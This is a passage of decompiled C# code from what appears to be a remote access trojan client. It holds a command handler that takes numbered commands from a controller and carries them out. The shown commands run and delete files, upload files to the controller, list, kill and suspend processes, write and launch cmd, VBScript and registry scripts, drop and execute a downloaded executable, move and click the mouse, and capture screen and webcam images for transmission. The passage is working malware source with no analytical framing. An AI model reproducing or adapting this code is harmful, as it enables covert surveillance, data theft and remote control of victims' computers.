					b15.SEND(ref C);
					text18 = "";
					break;
				}
				case "#11":
				{
					ER = 1;
					int num21 = array.Length - 1;
					for (int num22 = 1; num22 <= num21; num22++)
					{
						try
						{
							string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num22 }, (string[])null));
							string fileName = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num22, C }, (string[])null, true, false);
							Process.Start(fileName);
						}
						catch (Exception ex13)
						{
							ProjectData.SetProjectError(ex13, num2);
							ProjectData.ClearProjectError();
						}
					}
					break;
				}
				case "#12":
				{
					ER = 1;
					object[] array14 = new object[1];
					object[] array23 = array14;
					int num5 = 1;
					array23[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string text7 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					Array array24 = Strings.Split(text7, "\r\n", -1, (CompareMethod)0);
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array24, new object[1] { 3 }, (string[])null), (object)"DIR", false))
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array24, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array24, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array24, new object[1] { 2 }, (string[])null)));
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array24, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array24, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array24, new object[1] { 2 }, (string[])null)));
					}
					break;
				}
				case "#13":
				{
					ER = 1;
					int num16 = array.Length - 1;
					for (int num17 = 1; num17 <= num16; num17++)
					{
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num17 }, (string[])null));
						string path7 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num17, C }, (string[])null, true, false);
						if (Directory.Exists(path7))
						{
							try
							{
								string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num17 }, (string[])null));
								string path8 = API.DEB(ref S);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num17, S }, (string[])null, true, false);
								Directory.Delete(path8, recursive: true);
							}
							catch (Exception ex9)
							{
								ProjectData.SetProjectError(ex9, num2);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							try
							{
								C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num17 }, (string[])null));
								string path9 = API.DEB(ref C);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num17, C }, (string[])null, true, false);
								File.Delete(path9);
							}
							catch (Exception ex10)
							{
								ProjectData.SetProjectError(ex10, num2);
								ProjectData.ClearProjectError();
							}
						}
					}
					break;
				}
				case "#14":
				{
					ER = 1;
					object[] array14 = new object[1];
					object[] array19 = array14;
					int num5 = 1;
					array19[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string text5 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					FileSystem.MkDir(text5);
					break;
				}
				case "#15":
				{
					ER = 1;
					int num12 = array.Length - 1;
					for (int num13 = 1; num13 <= num12; num13++)
					{
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num13 }, (string[])null));
						string text4 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num13, C }, (string[])null, true, false);
						Array array18 = Strings.Split(text4, "\r\n", -1, (CompareMethod)0);
						if (Directory.Exists(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array18, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array18, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0)))
						{
							Directory.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array18, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array18, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array18, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array18, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
						}
						else
						{
							File.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array18, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array18, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array18, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array18, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
						}
					}
					break;
				}
				case "#16":
				{
					ER = 1;
					B b6 = MyProject.Forms.B;
					string text3 = "#11" + Y;
					object[] array16 = new object[1];
					object[] array17 = array16;
					int num5 = 1;
					array17[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array16, (string[])null));
					string path6 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					string S = File.ReadAllText(path6);
					string T = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text3 + API.ENB(ref S), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
					b6.SEND(ref T);
					break;
				}
				case "#17":
				{
					ER = 1;
					object[] array3 = new object[1];
					object[] array13 = array3;
					int num5 = 1;
					array13[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					string path5 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					object[] array14 = new object[1];
					object[] array15 = array14;
					int num11 = 2;
					array15[0] = 2;
					string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string contents = API.DEB(ref S);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, S }, (string[])null, true, false);
					File.WriteAllText(path5, contents);
					break;
				}
				case "#18":
				{
					ER = 1;
					object[] array3 = new object[1];
					object[] array9 = array3;
					int num5 = 1;
					array9[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					string path4 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					File.Create(path4);
					break;
				}
				case "#19":
				{
					ER = 1;
					MemoryStream memoryStream3 = new MemoryStream();
					int num3 = Strings.InStr(@string, Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), (CompareMethod)0) + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length + Y.Length - 1;
					int num4 = Da.Length - 1;
					for (int k = num3; k <= num4; k++)
					{
						memoryStream3.WriteByte(Da[k]);
					}
					object[] array3 = new object[1];
					object[] array4 = array3;
					int num5 = 1;
					array4[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					string path = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					byte[] b2 = memoryStream3.ToArray();
					bool CM = false;
					File.WriteAllBytes(path, API.ZIP(b2, ref CM));
					break;
				}
				case "#20":
				{
					ER = 1;
					object[] array3 = new object[1];
					object[] array5 = array3;
					int num5 = 1;
					array5[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					string text2 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					Array array6 = Strings.Split(text2, "\\", -1, (CompareMethod)0);
					MemoryStream memoryStream4 = new MemoryStream();
					byte[] array7 = (byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#12" + Y), NewLateBinding.LateIndexGet((object)array6, new object[1] { array6.Length - 1 }, (string[])null)), (object)Y) }, (string[])null, (Type[])null, (bool[])null);
					memoryStream4.Write(array7, 0, array7.Length);
					array3 = new object[1];
					object[] array8 = array3;
					num5 = 1;
					array8[0] = 1;
					C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					string path2 = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					byte[] b3 = File.ReadAllBytes(path2);
					bool CM = true;
					array7 = API.ZIP(b3, ref CM);
					memoryStream4.Write(array7, 0, array7.Length);
					array7 = null;
					MyProject.Forms.B.WC.SendData(memoryStream4.ToArray());
					memoryStream4.Dispose();
					break;
				}
				case "#21":
				{
					ER = 1;
					int num39 = array.Length - 1;
					for (int num40 = 1; num40 <= num39; num40++)
					{
						Thread.Sleep(10);
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num40 }, (string[])null));
						string text45 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num40, C }, (string[])null, true, false);
						Image val8 = (Image)new Bitmap(text45);
						val8.Dispose();
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num40 }, (string[])null));
						string text46 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num40, C }, (string[])null, true, false);
						Array array73 = Strings.Split(text46, "\\", -1, (CompareMethod)0);
						B b28 = MyProject.Forms.B;
						string[] array41 = new string[5] { "#13", Y, null, null, null };
						string[] array74 = array41;
						object[] array14 = new object[1];
						object[] array75 = array14;
						int num5 = array73.Length - 1;
						array75[0] = num5;
						string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array73, array14, (string[])null));
						string text47 = API.ENB(ref S);
						NewLateBinding.LateIndexSetComplex((object)array73, new object[2] { num5, S }, (string[])null, true, false);
						array74[2] = text47;
						array41[3] = Y;
						string[] array76 = array41;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num40 }, (string[])null));
						string path17 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num40, C }, (string[])null, true, false);
						array76[4] = API.FEN(File.ReadAllBytes(path17));
						string T = string.Concat(array41);
						b28.SEND(ref T);
					}
					break;
				}
				case "#22":
				{
					ER = 1;
					Process[] processes = Process.GetProcesses();
					string text44 = default(string);
					foreach (Process process3 in processes)
					{
						try
						{
							text44 = text44 + Y + process3.MainModule!.ModuleName + "*" + Conversions.ToString(process3.Id);
						}
						catch (Exception ex18)
						{
							ProjectData.SetProjectError(ex18, num2);
							text44 = text44 + Y + process3.ProcessName + "*" + Conversions.ToString(process3.Id);
							ProjectData.ClearProjectError();
						}
					}
					B b26 = MyProject.Forms.B;
					string C = "#14" + text44;
					b26.SEND(ref C);
					text44 = "";
					break;
				}
				case "#23":
				{
					ER = 1;
					int num36 = array.Length - 1;
					for (int num37 = 1; num37 <= num36; num37++)
					{
						Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num37 }, (string[])null))).Kill();
					}
					break;
				}
				case "#24":
				{
					try
					{
						chat.clos = true;
					}
					catch (Exception ex17)
					{
						ProjectData.SetProjectError(ex17, num2);
						ProjectData.ClearProjectError();
					}
					Thread.Sleep(100);
					object[] array3 = new object[1];
					object[] array68 = array3;
					int num5 = 1;
					array68[0] = 1;
					string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					string cht = API.DEB(ref C);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
					B.Cht = cht;
					break;
				}
				case "#25":
					ER = 0;
					if (((Control)B.Chat).get_InvokeRequired())
					{
						indd indd = inddd;
						object[] array3 = new object[1];
						object[] array62 = array3;
						int num5 = 1;
						array62[0] = 1;
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						string text36 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
						string text37 = text36;
						((Control)B.Chat).Invoke((Delegate)indd, new object[1] { text37 });
					}
					else
					{
						RichTextBox t = B.Chat.T1;
						string[] array41 = new string[5]
						{
							t.get_Text(),
							MyProject.Forms.chat.nick,
							" : ",
							null,
							null
						};
						string[] array63 = array41;
						object[] array3 = new object[1];
						object[] array64 = array3;
						int num5 = 1;
						array64[0] = 1;
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						string text38 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
						array63[3] = text38;
						array41[4] = "\r\n";
						t.set_Text(string.Concat(array41));
					}
					break;
				case "#26":
					ER = 0;
					chat.clos = true;
					break;
				case "#27":
				{
					ER = 1;
					int num34 = 0;
					string s2 = default(string);
					do
					{
						if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num34), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
						{
							try
							{
								FileSystem.Kill(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num34), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
								s2 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num34), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
							}
							catch (Exception ex16)
							{
								ProjectData.SetProjectError(ex16, num2);
								ProjectData.ClearProjectError();
								goto IL_2f6e;
							}
						}
						else
						{
							s2 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num34), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
						}
						break;
						IL_2f6e:
						num34++;
					}
					while (num34 <= 9999);
					string C;
					switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.ToLower())
					{
					case "cmd":
					{
						string path16 = s2;
						object[] array16 = new object[1];
						object[] array55 = array16;
						int num5 = 2;
						array55[0] = 2;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array16, (string[])null));
						string contents5 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
						File.WriteAllText(path16, contents5);
						Interaction.Shell(s2, (AppWinStyle)0, false, -1);
						break;
					}
					case "vbs":
					{
						string path15 = s2;
						object[] array3 = new object[1];
						object[] array54 = array3;
						int num5 = 2;
						array54[0] = 2;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						string contents4 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
						File.WriteAllText(path15, contents4);
						Process.Start(s2);
						break;
					}
					case "Reg":
					{
						string path14 = s2;
						object[] array3 = new object[1];
						object[] array53 = array3;
						int num5 = 2;
						array53[0] = 2;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						string contents3 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
						File.WriteAllText(path14, contents3);
						Interaction.Shell(s2, (AppWinStyle)2, false, -1);
						break;
					}
					default:
					{
						string path13 = s2;
						object[] array3 = new object[1];
						object[] array52 = array3;
						int num5 = 2;
						array52[0] = 2;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						string contents2 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, C }, (string[])null, true, false);
						File.WriteAllText(path13, contents2);
						Process.Start(s2);
						break;
					}
					}
					B b16 = MyProject.Forms.B;
					C = "#10" + Y + "^" + Conversions.ToString(4) + Y + API.ENB(ref s2);
					b16.SEND(ref C);
					break;
				}
				case "#28":
				{
					ER = 1;
					object obj2 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj2, (object)"!", false))
					{
						B b12 = MyProject.Forms.B;
						string y2 = Y;
						string C = "plugin.C";
						string S = "W";
						object P = new object[0];
						string T = Conversions.ToString(global::n.C.inv(ref global::n.C.Plug, ref C, ref S, ref P));
						string T2 = "#17" + y2 + API.ENB(ref T);
						b12.SEND(ref T2);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"@", false))
					{
						int num20 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
						string S = "plugin.C";
						string T = "CW";
						object[] array14 = new object[2] { num20, null };
						object[] array25 = array14;
						object[] array3 = new object[1];
						object[] array26 = array3;
						int num5 = 3;
						array26[0] = 3;
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						string text10 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, C }, (string[])null, true, false);
						array25[1] = text10;
						object P = array14;
						global::n.C.inv(ref global::n.C.Plug, ref S, ref T, ref P);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"#", false))
					{
						object[] array3 = new object[1];
						object[] array27 = array3;
						int num5 = 2;
						array27[0] = 2;
						int num11 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						object[] array14 = new object[1];
						object[] array28 = array14;
						int q = 3;
						array28[0] = 3;
						int num10 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
						API.wd.G(ref num11, ref num10);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, num10 }, (string[])null, true, false);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, num11 }, (string[])null, true, false);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"$", false))
					{
						MemoryStream memoryStream11 = new MemoryStream();
						object[] array3 = new object[1];
						object[] array29 = array3;
						int num10 = 2;
						array29[0] = 2;
						int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						Image obj3 = global::n.C.Capture(ref q);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, q }, (string[])null, true, false);
						obj3.Save((Stream)memoryStream11, ImageFormat.get_Jpeg());
						MemoryStream memoryStream12 = new MemoryStream();
						memoryStream12.Write(MyProject.Forms.B.WC.STB("#18" + Y), 0, MyProject.Forms.B.WC.STB("#18" + Y).Length);
						memoryStream12.Write(memoryStream11.ToArray(), 0, memoryStream11.ToArray().Length);
						MyProject.Forms.B.WC.SendData(memoryStream12.ToArray());
						memoryStream11.Dispose();
						memoryStream12.Dispose();
						MyProject.Forms.B = null;
					}
					break;
				}
				case "#29":
				{
					ER = 0;
					B b9 = MyProject.Forms.B;
					string C = "#Bla";
					b9.SEND(ref C);
					int num18 = 0;
					string text6 = default(string);
					do
					{
						if (File.Exists(Interaction.Environ("temp") + "\\" + Conversions.ToString(num18) + ".exe"))
						{
							try
							{
								File.Delete(Interaction.Environ("temp") + "\\" + Conversions.ToString(num18) + ".exe");
								text6 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num18) + ".exe";
							}
							catch (Exception ex12)
							{
								ProjectData.SetProjectError(ex12, num2);
								ProjectData.ClearProjectError();
								goto IL_3619;
							}
						}
						else
						{
							text6 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num18) + ".exe";
						}
						break;
						IL_3619:
						num18++;
					}
					while (num18 <= 999);
					string path10 = text6;
					byte[] b10 = API.FDE(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					bool CM = false;
					File.WriteAllBytes(path10, API.ZIP(b10, ref CM));
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
					processStartInfo2.FileName = text6;
					processStartInfo2.Arguments = "!0@" + Application.get_ExecutablePath() + "@" + B.SU + "@" + Conversions.ToString(Process.GetCurrentProcess().Id);
					Process.Start(processStartInfo2);
					break;
				}
				case "#30":
					try
					{
						object[] array3 = new object[1];
						object[] array20 = array3;
						int num10 = 1;
						array20[0] = 1;
						int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
						byte[] array21 = sc.gc(ref q);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
						byte[] array22 = array21;
						MemoryStream memoryStream10 = new MemoryStream();
						memoryStream10.Write(Encoding.Default.GetBytes("#19" + Y), 0, Encoding.Default.GetBytes("#19" + Y).Length);
						memoryStream10.Write(array22, 0, array22.Length);
						MyProject.Forms.B.WC.SendData(memoryStream10.ToArray());
						break;
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11, num2);
						ProjectData.ClearProjectError();
						break;
					}
				case "#31":
					ER = 0;
					if (!B.Busy)
					{
						B.Busy = true;
						B b8 = MyProject.Forms.B;
						string C = "#16" + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width) + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
						b8.SEND(ref C);
						B.Busy = false;
					}
					break;
				case "#32":
				{
					ER = 0;
					Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
					Cursor.set_Position(position);
					object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj, (object)0, false))
					{
						mouse_event(8, 0, 0, 0, 1);
						mouse_event(16, 0, 0, 0, 1);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)1, false))
					{
						mouse_event(2, 0, 0, 0, 1);
						mouse_event(4, 0, 0, 0, 1);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)2, false))
					{
						mouse_event(2, 0, 0, 0, 1);
						mouse_event(4, 0, 0, 0, 1);
						mouse_event(2, 0, 0, 0, 1);
						mouse_event(4, 0, 0, 0, 1);
					}
					break;
				}
				case "#33":
				{
					B b5 = MyProject.Forms.B;
					string C = "#5" + Y + API.Gt();
					b5.SEND(ref C);
					break;
				}
				case "#34":
				{
					ER = 0;
					object[] array3 = new object[1];
					object[] array10 = array3;
					int num10 = 1;
					array10[0] = 1;
					int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array3, (string[])null));
					byte[] array11 = global::n.C.Capture1(ref q);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
					byte[] array12 = array11;
					if (array12.Length != 0)
					{
						MemoryStream memoryStream8 = new MemoryStream();
						memoryStream8.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
						memoryStream8.Write(array12, 0, array12.Length);
						MyProject.Forms.B.WC.SendData(memoryStream8.ToArray());
					}
					break;
				}
				case "#35":
				{
					int num8 = array.Length - 1;
					for (int num9 = 1; num9 <= num8; num9++)
					{
						NTSuspendProcess.SuspendProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num9 }, (string[])null)));
					}
					break;
				}
				case "#36":
				{
					int num7 = array.Length - 1;
					for (int l = 1; l <= num7; l++)
					{
						NTSuspendProcess.ResumeProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null)));
					}
					break;
				}
				case "#37":
				{
					byte[] cam = Resources.Cam;
					bool CM = false;
					MemoryStream memoryStream7 = new MemoryStream(API.ZIP(cam, ref CM));
					byte[] F = memoryStream7.ToArray();
					string C = "Cam.Cam";
					string S = "Dnames";
					object P = null;
					string s = Conversions.ToString(global::n.C.inv(ref F, ref C, ref S, ref P));
					B b4 = MyProject.Forms.B;
					C = "#22" + Y + API.ENB(ref s);
					b4.SEND(ref C);
					break;
				}
				case "#38":
				{
					int num6 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					string C = "Cam.Cam";
					string S = "Cam";
					object P = new object[2]
					{
						num6,
						RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null))
					};
					Image val3 = (Image)NewLateBinding.LateGet(global::n.C.inv(ref Cdll, ref C, ref S, ref P), (Type)null, "Clone", new object[0], (string[])null, (Type[])null, (bool[])null);
					MemoryStream memoryStream5 = new MemoryStream();
					val3.Save((Stream)memoryStream5, ImageFormat.get_Jpeg());
					MemoryStream memoryStream6 = new MemoryStream();
					memoryStream6.Write(MyProject.Forms.B.WC.STB("#23" + Y), 0, MyProject.Forms.B.WC.STB("#23" + Y).Length);
					memoryStream6.Write(memoryStream5.ToArray(), 0, memoryStream5.ToArray().Length);
					MyProject.Forms.B.WC.SendData(memoryStream6.ToArray());
					break;
				}
				case "#39":
				{
					if (B.Busy)
					{
						break;
					}
					B.Busy = true;
					string C = "Cam.Cam";
					string S = "Dnames";
					object P = null;
					Array array2 = Strings.Split(Conversions.ToString(global::n.C.inv(ref Cdll, ref C, ref S, ref P)), "^:^", -1, (CompareMethod)0);
					if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null), (object)"", false))
					{
						int num = array2.Length - 1;
						for (int i = 0; i <= num; i++)
						{
							try
							{
								string text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { i }, (string[])null));
								C = "Cam.Cam";
								S = "Cam";
								P = new object[2] { 5, text };
								Image val = (Image)global::n.C.inv(ref Cdll, ref C, ref S, ref P);
								MemoryStream memoryStream = new MemoryStream();
								val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								MemoryStream memoryStream2 = new MemoryStream();
								memoryStream2.Write(MyProject.Forms.B.WC.STB("#24" + Y), 0, MyProject.Forms.B.WC.STB("#24" + Y).Length);
								memoryStream2.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
								MyProject.Forms.B.WC.SendData(memoryStream2.ToArray());
								B.Busy = false;
								return;
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex, num2);
								ProjectData.ClearProjectError();
							}
							Thread.Sleep(1000);
						}
					}
					num2 = 39;
					B.Busy = false;
					B b = MyProject.Forms.B;
					C = "#25";
					b.SEND(ref C);
					break;
				}
				}
			}
			catch (Exception ex20)
			{
				ProjectData.SetProjectError(ex20, num2);
				Exception ex21 = ex20;
				B.Busy = false;
				B b29 = MyProject.Forms.B;
				string[] array41 = new string[6]
				{
					"#10",
					Y,
					"^",
					Conversions.ToString(ER),
					Y,
					null
				};
				string[] array77 = array41;
				string C = ex21.Message;
				array77[5] = API.ENB(ref C);
				string S = string.Concat(array41);
				b29.SEND(ref S);
				ER = 0;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string siz(string Size)
	{
		if (Size.Length < 4)
		{
			return Size + " Bytes";
		}
		string text = Conversions.ToString(Conversions.ToDouble(Size) / 1024.0);
		string text2 = " KB";
		int num = default(int);
		if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
		{
			Array array = Strings.Split(text, ".", -1, (CompareMethod)0);
			text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null));
			num = ((NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), 1, 3)));
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " MB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array2 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " GB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array3 = Strings.Split(text, ".", -1, (CompareMethod)0);
